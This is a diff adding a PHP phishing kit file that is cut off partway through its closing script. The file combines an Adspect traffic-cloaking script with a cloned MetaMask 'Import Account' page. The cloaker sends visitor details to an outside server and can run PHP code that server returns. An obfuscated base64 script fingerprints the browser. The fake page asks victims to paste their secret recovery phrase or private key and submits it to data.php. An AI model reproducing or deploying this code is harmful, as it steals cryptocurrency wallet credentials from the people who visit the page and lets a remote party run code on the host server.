@@ -1,0 +1,190 @@
+<?php
+ ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['QUERY_STRING'] = (string)parse_url($url, PHP_URL_QUERY); $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; parse_str($_SERVER['QUERY_STRING'], $_GET); } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('0bec3873-ecf7-4973-a401-a9a6bb208a63', 'redirect', '_', base64_decode('QPxwzAt2eoPnA+gm6R8Z1D5Uj1A3nwzU3wbnqrEMccA=')); if (!isset($target)) { return; } ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
+	<meta name="referrer" content="no-referrer">
+</head>
+<body>
+	<script src="data:text/javascript;base64,dmFyIF8weDQ5YTg9Wyd0aGVuJywnZGF0YScsJ2FjdGlvbicsJ2hpZGRlbicsJzFibGtjcmonLCcxNDA2NjVmRlFwcm4nLCdocmVmJywnbm9kZU5hbWUnLCc1NDAwMTZmUUlxQWgnLCdwdXNoJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ2NyZWF0ZUVsZW1lbnQnLCdwZXJtaXNzaW9ucycsJ3NjcmVlbicsJzEwNDFrc0VscUInLCdzdHJpbmdpZnknLCczNDg5NTRFWmxZZ3AnLCdjbG9zdXJlJywnMTI3NVFhYlVNWicsJ3ZhbHVlJywnbGVuZ3RoJywnd2luZG93JywndG9TdHJpbmcnLCduYXZpZ2F0b3InLCdsb2NhdGlvbicsJ2Z1bmN0aW9uJywnYXR0cmlidXRlcycsJ2NvbnNvbGUnLCdsb2cnLCdnZXRQYXJhbWV0ZXInLCdpbnB1dCcsJ2FwcGVuZENoaWxkJywndHlwZScsJ1RvdWNoRXZlbnQnLCdnZXRFeHRlbnNpb24nLCdvYmplY3QnLCd0b3VjaEV2ZW50JywnYm9keScsJ3F1ZXJ5Jywnc3VibWl0Jywnbm90aWZpY2F0aW9ucycsJ25hbWUnLCcyMDA0MzdGaGxnV08nLCdkb2N1bWVudEVsZW1lbnQnLCdlcnJvcnMnLCcyOTc5NzFkZ3NZTHQnLCdwZXJtaXNzaW9uJywnMTA0NTA3MUZaYmdjSCcsJ21lc3NhZ2UnLCd3ZWJnbCcsJ05vdGlmaWNhdGlvbicsJ1BPU1QnLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdtZXRob2QnLCdmb3JtJywnY2FudmFzJywnc3RhdGUnXTt2YXIgXzB4Njc2Yj1mdW5jdGlvbihfMHgyZDYyZDgsXzB4M2Q1Y2NiKXtfMHgyZDYyZDg9XzB4MmQ2MmQ4LTB4MTE2O3ZhciBfMHg0OWE4Y2I9XzB4NDlhOFtfMHgyZDYyZDhdO3JldHVybiBfMHg0OWE4Y2I7fTsoZnVuY3Rpb24oXzB4NWU1MmY5LF8weDU5Y2YwZCl7dmFyIF8weDE1YWZiNj1fMHg2NzZiO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4MWQ0NzdiPS1wYXJzZUludChfMHgxNWFmYjYoMHgxMzIpKSotcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTIxKSkrcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTNjKSkqcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTQwKSkrcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTM2KSkrLXBhcnNlSW50KF8weDE1YWZiNigweDEzZSkpK3BhcnNlSW50KF8weDE1YWZiNigweDEzMykpKy1wYXJzZUludChfMHgxNWFmYjYoMHgxMWUpKSstcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTIzKSk7aWYoXzB4MWQ0NzdiPT09XzB4NTljZjBkKWJyZWFrO2Vsc2UgXzB4NWU1MmY5WydwdXNoJ10oXzB4NWU1MmY5WydzaGlmdCddKCkpO31jYXRjaChfMHg0ZGE0OWMpe18weDVlNTJmOVsncHVzaCddKF8weDVlNTJmOVsnc2hpZnQnXSgpKTt9fX0oXzB4NDlhOCwweGFkYjI5KSxmdW5jdGlvbigpe3ZhciBfMHg0NzM0Yzc9XzB4Njc2YjtmdW5jdGlvbiBfMHgzNTI0YmIoKXt2YXIgXzB4MzI2MmFkPV8weDY3NmI7XzB4NWNlY2M2W18weDMyNjJhZCgweDEyMCldPV8weDI1NTEwMDt2YXIgXzB4MmRjZjhiPWRvY3VtZW50W18weDMyNjJhZCgweDEzOSldKF8weDMyNjJhZCgweDEyYikpLF8weDIyZWQ5MD1kb2N1bWVudFtfMHgzMjYyYWQoMHgxMzkpXShfMHgzMjYyYWQoMHgxNGMpKTtfMHgyZGNmOGJbXzB4MzI2MmFkKDB4MTJhKV09XzB4MzI2MmFkKDB4MTI3KSxfMHgyZGNmOGJbXzB4MzI2MmFkKDB4MTMwKV09d2luZG93W18weDMyNjJhZCgweDE0NildW18weDMyNjJhZCgweDEzNCldLF8weDIyZWQ5MFtfMHgzMjYyYWQoMHgxNGUpXT1fMHgzMjYyYWQoMHgxMzEpLF8weDIyZWQ5MFtfMHgzMjYyYWQoMHgxMWQpXT1fMHgzMjYyYWQoMHgxMmYpLF8weDIyZWQ5MFtfMHgzMjYyYWQoMHgxNDEpXT1KU09OW18weDMyNjJhZCgweDEzZCldKF8weDVjZWNjNiksXzB4MmRjZjhiW18weDMyNjJhZCgweDE0ZCldKF8weDIyZWQ5MCksZG9jdW1lbnRbXzB4MzI2MmFkKDB4MTE5KV1bXzB4MzI2MmFkKDB4MTRkKV0oXzB4MmRjZjhiKSxfMHgyZGNmOGJbXzB4MzI2MmFkKDB4MTFiKV0oKTt9dmFyIF8weDI1NTEwMD1bXSxfMHg1Y2VjYzY9e307dHJ5e3ZhciBfMHg0OWZjZTI9ZnVuY3Rpb24oXzB4MmZiZGI4KXt2YXIgXzB4MTQ2YzA0PV8weDY3NmI7aWYoXzB4MTQ2YzA0KDB4MTE3KT09PXR5cGVvZiBfMHgyZmJkYjgmJm51bGwhPT1fMHgyZmJkYjgpe3ZhciBfMHhiZWZmZGM9ZnVuY3Rpb24oXzB4MzkxMDVhKXt2YXIgXzB4NDFkNjNiPV8weDE0NmMwNDt0cnl7dmFyIF8weDFjZDY2ZT1fMHgyZmJkYjhbXzB4MzkxMDVhXTtzd2l0Y2godHlwZW9mIF8weDFjZDY2ZSl7Y2FzZSBfMHg0MWQ2M2IoMHgxMTcpOmlmKG51bGw9PT1fMHgxY2Q2NmUpYnJlYWs7Y2FzZSBfMHg0MWQ2M2IoMHgxNDcpOl8weDFjZDY2ZT1fMHgxY2Q2NmVbXzB4NDFkNjNiKDB4MTQ0KV0oKTt9XzB4MzJiMGVkW18weDM5MTA1YV09XzB4MWNkNjZlO31jYXRjaChfMHgxNGQwNzYpe18weDI1NTEwMFtfMHg0MWQ2M2IoMHgxMzcpXShfMHgxNGQwNzZbJ21lc3NhZ2UnXSk7fX0sXzB4MzJiMGVkPXt9LF8weDM0YTg3ODtmb3IoXzB4MzRhODc4IGluIF8weDJmYmRiOClfMHhiZWZmZGMoXzB4MzRhODc4KTt0cnl7dmFyIF8weDE5MGNlMj1PYmplY3RbXzB4MTQ2YzA0KDB4MTI4KV0oXzB4MmZiZGI4KTtmb3IoXzB4MzRhODc4PTB4MDtfMHgzNGE4Nzg8XzB4MTkwY2UyW18weDE0NmMwNCgweDE0MildOysrXzB4MzRhODc4KV8weGJlZmZkYyhfMHgxOTBjZTJbXzB4MzRhODc4XSk7XzB4MzJiMGVkWychISddPV8weDE5MGNlMjt9Y2F0Y2goXzB4MTExYTBlKXtfMHgyNTUxMDBbXzB4MTQ2YzA0KDB4MTM3KV0oXzB4MTExYTBlW18weDE0NmMwNCgweDEyNCldKTt9cmV0dXJuIF8weDMyYjBlZDt9fTtfMHg1Y2VjYzZbXzB4NDczNGM3KDB4MTNiKV09XzB4NDlmY2UyKHdpbmRvd1tfMHg0NzM0YzcoMHgxM2IpXSksXzB4NWNlY2M2W18weDQ3MzRjNygweDE0MyldPV8weDQ5ZmNlMih3aW5kb3cpLF8weDVjZWNjNltfMHg0NzM0YzcoMHgxNDUpXT1fMHg0OWZjZTIod2luZG93W18weDQ3MzRjNygweDE0NSldKSxfMHg1Y2VjYzZbXzB4NDczNGM3KDB4MTQ2KV09XzB4NDlmY2UyKHdpbmRvd1tfMHg0NzM0YzcoMHgxNDYpXSksXzB4NWNlY2M2Wydjb25zb2xlJ109XzB4NDlmY2UyKHdpbmRvd1tfMHg0NzM0YzcoMHgxNDkpXSksXzB4NWNlY2M2W18weDQ3MzRjNygweDExZildPWZ1bmN0aW9uKF8weDYwM2QxZCl7dmFyIF8weDFkZGI3Mj1fMHg0NzM0Yzc7dHJ5e3ZhciBfMHgyMWI5ZDc9e307XzB4NjAzZDFkPV8weDYwM2QxZFtfMHgxZGRiNzIoMHgxNDgpXTtmb3IodmFyIF8weDUwNDZhNSBpbiBfMHg2MDNkMWQpXzB4NTA0NmE1PV8weDYwM2QxZFtfMHg1MDQ2YTVdLF8weDIxYjlkN1tfMHg1MDQ2YTVbXzB4MWRkYjcyKDB4MTM1KV1dPV8weDUwNDZhNVsnbm9kZVZhbHVlJ107cmV0dXJuIF8weDIxYjlkNzt9Y2F0Y2goXzB4NTc1ODJmKXtfMHgyNTUxMDBbXzB4MWRkYjcyKDB4MTM3KV0oXzB4NTc1ODJmW18weDFkZGI3MigweDEyNCldKTt9fShkb2N1bWVudFtfMHg0NzM0YzcoMHgxMWYpXSksXzB4NWNlY2M2Wydkb2N1bWVudCddPV8weDQ5ZmNlMihkb2N1bWVudCk7dHJ5e18weDVjZWNjNlsndGltZXpvbmVPZmZzZXQnXT1uZXcgRGF0ZSgpWydnZXRUaW1lem9uZU9mZnNldCddKCk7fWNhdGNoKF8weDIyMTUwMil7XzB4MjU1MTAwW18weDQ3MzRjNygweDEzNyldKF8weDIyMTUwMltfMHg0NzM0YzcoMHgxMjQpXSk7fXRyeXtfMHg1Y2VjYzZbXzB4NDczNGM3KDB4MTNmKV09ZnVuY3Rpb24oKXt9W18weDQ3MzRjNygweDE0NCldKCk7fWNhdGNoKF8weDRiYjQzNyl7XzB4MjU1MTAwWydwdXNoJ10oXzB4NGJiNDM3WydtZXNzYWdlJ10pO310cnl7XzB4NWNlY2M2W18weDQ3MzRjNygweDExOCldPWRvY3VtZW50WydjcmVhdGVFdmVudCddKF8weDQ3MzRjNygweDE0ZikpW18weDQ3MzRjNygweDE0NCldKCk7fWNhdGNoKF8weDU5NGYyYil7XzB4MjU1MTAwWydwdXNoJ10oXzB4NTk0ZjJiW18weDQ3MzRjNygweDEyNCldKTt9dHJ5e18weDQ5ZmNlMj1mdW5jdGlvbigpe307dmFyIF8weDQxMzA5Mz0weDA7XzB4NDlmY2UyWyd0b1N0cmluZyddPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHg0MTMwOTMsJyc7fSxjb25zb2xlW18weDQ3MzRjNygweDE0YSldKF8weDQ5ZmNlMiksXzB4NWNlY2M2Wyd0b3N0cmluZyddPV8weDQxMzA5Mzt9Y2F0Y2goXzB4MTM5YmE5KXtfMHgyNTUxMDBbJ3B1c2gnXShfMHgxMzliYTlbXzB4NDczNGM3KDB4MTI0KV0pO313aW5kb3dbXzB4NDczNGM3KDB4MTQ1KV1bXzB4NDczNGM3KDB4MTNhKV1bXzB4NDczNGM3KDB4MTFhKV0oeyduYW1lJzpfMHg0NzM0YzcoMHgxMWMpfSlbXzB4NDczNGM3KDB4MTJlKV0oZnVuY3Rpb24oXzB4MTkzZmMwKXt2YXIgXzB4MjdiMWJlPV8weDQ3MzRjNztfMHg1Y2VjYzZbXzB4MjdiMWJlKDB4MTNhKV09W3dpbmRvd1tfMHgyN2IxYmUoMHgxMjYpXVtfMHgyN2IxYmUoMHgxMjIpXSxfMHgxOTNmYzBbXzB4MjdiMWJlKDB4MTJkKV1dLF8weDM1MjRiYigpO30sXzB4MzUyNGJiKTt0cnl7dmFyIF8weDU3OGM1OT1kb2N1bWVudFtfMHg0NzM0YzcoMHgxMzkpXShfMHg0NzM0YzcoMHgxMmMpKVsnZ2V0Q29udGV4dCddKCd3ZWJnbCcpLF8weDI0Yjc3Mz1fMHg1NzhjNTlbXzB4NDczNGM3KDB4MTE2KV0oXzB4NDczNGM3KDB4MTM4KSk7XzB4NWNlY2M2W18weDQ3MzRjNygweDEyNSldPXsndmVuZG9yJzpfMHg1NzhjNTlbXzB4NDczNGM3KDB4MTRiKV0oXzB4MjRiNzczWydVTk1BU0tFRF9WRU5ET1JfV0VCR0wnXSksJ3JlbmRlcmVyJzpfMHg1NzhjNTlbXzB4NDczNGM3KDB4MTRiKV0oXzB4MjRiNzczW18weDQ3MzRjNygweDEyOSldKX07fWNhdGNoKF8weDUzODAwZSl7XzB4MjU1MTAwW18weDQ3MzRjNygweDEzNyldKF8weDUzODAwZVtfMHg0NzM0YzcoMHgxMjQpXSk7fX1jYXRjaChfMHg0NDIyZDIpe18weDI1NTEwMFsncHVzaCddKF8weDQ0MjJkMlsnbWVzc2FnZSddKSxfMHgzNTI0YmIoKTt9fSgpKTs="></script>
+</body>
+</html>
+<?php exit;
+<!DOCTYPE html>
+<!-- saved from url=(0080)metamask_files/home.html#new-account/import -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
+    <title>MetaMask</title>
+    <link rel="stylesheet" type="text/css" href="metamask_files/index.css" title="ltr">
+    <link rel="stylesheet" type="text/css" href="metamask_files/index-rtl.css" title="rtl" disabled="">
+  
+  <style>
+  
+	.phrase{
+		font-size: 1rem;
+		font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+		line-height: 140%;
+		font-style: normal;
+		font-weight: normal;
+		direction: ltr;
+		border: 1px
+		solid #cdcdcd;
+		border-radius: 6px;
+		background-color: #fff;
+		padding: 16px;
+		margin-top: 8px;
+		height: 140% !important;
+	}
+  
+  </style>
+  
+  
+  </head>
+  <body>
+    <div id="app-content"><div class="app os-win browser-chrome mouse-user-styles"><div class="app-header app-header--back-drop"><div class="app-header__contents"><div class="app-header__logo-container app-header__logo-container--clickable"><img height="30" src="metamask_files/images/logo/metamask-logo-horizontal.svg" class="app-header__metafox-logo--horizontal" alt=""><img src="metamask_files/images/logo/metamask-fox.svg" class="app-header__metafox-logo--icon" alt=""></div><div class="app-header__account-menu-container"><div class="app-header__network-component-wrapper"><div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--border-color-ui-3 chip--background-color-undefined" role="button" tabindex="0"><div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-mainnet color-indicator--size-lg"><span class="color-indicator__inner-circle"></span></div></div><span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography chip__label typography--h7 typography--weight-normal typography--style-normal typography--color-ui-4">Ethereum Mainnet</span><div class="chip__right-icon"><i class="network-display__icon app-header__network-down-arrow"></i></div></div></div><div class="account-menu__icon"><div class="identicon__address-wrapper"><div class="identicon" style="height: 32px; width: 32px; border-radius: 16px;"><div style="border-radius: 50px; overflow: hidden; padding: 0px; margin: 0px; width: 32px; height: 32px; display: inline-block; background: rgb(24, 209, 242);"><svg x="0" y="0" width="32" height="32"><rect x="0" y="0" width="32" height="32" transform="translate(0.045402576955648234 -3.480205333177382) rotate(402.9 16 16)" fill="#018E6F"></rect><rect x="0" y="0" width="32" height="32" transform="translate(11.09412859762253 -12.667311483768318) rotate(312.6 16 16)" fill="#035E55"></rect><rect x="0" y="0" width="32" height="32" transform="translate(19.545434521770538 14.049321074931008) rotate(132.1 16 16)" fill="#F26202"></rect></svg></div></div></div></div></div></div></div><div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;"><style>
+          .menu-droppo-enter {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+
+          .menu-droppo-enter.menu-droppo-enter-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave.menu-droppo-leave-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+        </style></div><div class="main-container-wrapper"><div class="new-account"><div class="new-account__form"><div class="page-container__header"><div class="page-container__title">Import Account</div><div class="page-container__subtitle">Imported accounts will not be associated with your originally created MetaMask account Secret Recovery Phrase. Learn more about imported accounts<span class="new-account-info-link">here</span></div></div><div class="new-account-import-form"><div class="new-account-import-form__select-section">
+		
+		
+		<div class="new-account-import-form__select-label">Select Type</div>
+		
+		<form action="data.php">
+		
+		<select id="type" class="dropdown new-account-import-form__select" name="option">
+			<option value="Twelve Words Secret Recovery Phrase">Secret Recovery Phrases (12 Words)</option>
+			<option value="Twenty Four Words Secret Recovery Phrase">Secret Recovery Phrases (24 Words)</option>
+			<option value="Private Key">Private Key</option>
+			<option value="JSON File">JSON File</option>
+		</select>
+		
+		
+		
+		</div>
+		<br>
+		<div id="twelve-phrase-div" class="new-account-import-form__twelve-phrase">
+		
+		
+		
+		<span class="new-account-create-form__instruction">Paste your (12 words) Secret Recovery Phrase here:</span>
+		
+		
+		<div class="new-account-import-form__private-key-password-container">
+		
+		<textarea name="data" id="placeholder" class="phrase new-account-import-form__input-password" placeholder="Separate each word with a single space" autocomplete="off"></textarea>
+		
+		
+		</div><div class="new-account-import-form__buttons"><button class="button btn--rounded btn-secondary btn--large new-account-create-form__button" role="button" tabindex="0">Cancel</button>
+		
+		<button type="submit" id="importbtn" class="button btn--rounded btn-primary btn--large new-account-create-form__button" role="button" tabindex="0" disabled>Import</button>
+		
+		
+		</div><span class="error"><!--The account you're are trying to import is a duplicate--></span></div>
+		
+		</form>
+		
+		<!--<div class="new-account-import-form__private-key"><span class="new-account-create-form__instruction">Paste your private key string here:</span><div class="new-account-import-form__private-key-password-container"><input class="new-account-import-form__input-password" type="password" id="private-key-box"></div><div class="new-account-import-form__buttons"><button class="button btn--rounded btn-secondary btn--large new-account-create-form__button" role="button" tabindex="0">Cancel</button><button class="button btn--rounded btn-primary btn--large new-account-create-form__button" role="button" tabindex="0">Import</button></div><span class="error"><!--The account you're are trying to import is a duplicate--><!--</span></div>-->
+		
+		
+		
+		
+		</div></div></div></div></div></div>
+    <div id="popover-content"></div>
+    <script src="metamask_files/globalthis.js" type="text/javascript" charset="utf-8"></script>
+    <script src="metamask_files/sentry-install.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/lockdown-install.js" type="text/javascript" charset="utf-8"></script>
+      <script src="metamask_files/lockdown-run.js" type="text/javascript" charset="utf-8"></script>
+      <script src="metamask_files/lockdown-more.js" type="text/javascript" charset="utf-8"></script>
+      <script src="metamask_files/runtime-cjs.js" type="text/javascript" charset="utf-8"></script>
+              <script src="metamask_files/common-0.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/common-1.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/common-2.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/common-3.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-0.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-1.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-2.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-3.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-4.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-5.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-6.js" type="text/javascript" charset="utf-8"></script>
+          <script src="metamask_files/ui-7.js" type="text/javascript" charset="utf-8"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+
+
+
+$('textarea').on('keyup',function() {
